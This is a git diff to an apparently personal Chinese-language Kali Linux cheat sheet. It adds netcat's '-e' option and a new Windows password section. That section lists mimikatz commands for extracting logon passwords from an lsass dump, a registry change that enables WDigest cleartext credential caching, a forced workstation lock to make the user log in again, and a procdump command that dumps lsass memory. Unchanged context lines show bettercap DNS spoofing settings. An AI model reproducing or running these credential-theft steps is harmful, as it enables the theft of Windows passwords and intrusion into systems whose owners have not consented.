@@ -1,4 +1,4 @@
-# Kali 操作
+# Kali
 
 ## 更新升级
 
@@ -59,6 +59,7 @@ ftp -s:ftp.txt
 -l     //绑定并监听传入连接
 -p     //指定要使用的端口
 -c     //通过/bin/sh 执行给定的命令
+-e     //连接后执行程序
 -q     //执行完毕X秒后退出
 -n     //数字ip,不通过DNS解析
 -v     //显示详细信息
@@ -165,4 +166,21 @@ set net.sniff.local true                    //只显示本地数据
 set dns.spoof.domains google.com            //设置要欺骗的域名
 set dns.spoof.address desired_IP            //设置要重定向的地址
 set dns.spoof.all true                      //回应任何请求(默认只会回应那些对本地的请求)
+```
+
+## window-Password
+
+- laZagne
+- mimikatz
+
+```
+privilege::debug
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords full
+------------------------------------------------------------------------------------------------------------------
+#修改注册表开启/关闭Wdigest Auth
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
+rundll32 user32.dll,LockWorkStation                         #强制锁屏,使其重新登录
+procdump.exe -accepteula -ma lsass.exe lsass.dmp            #导出内存文件lsass.dmp
 ```
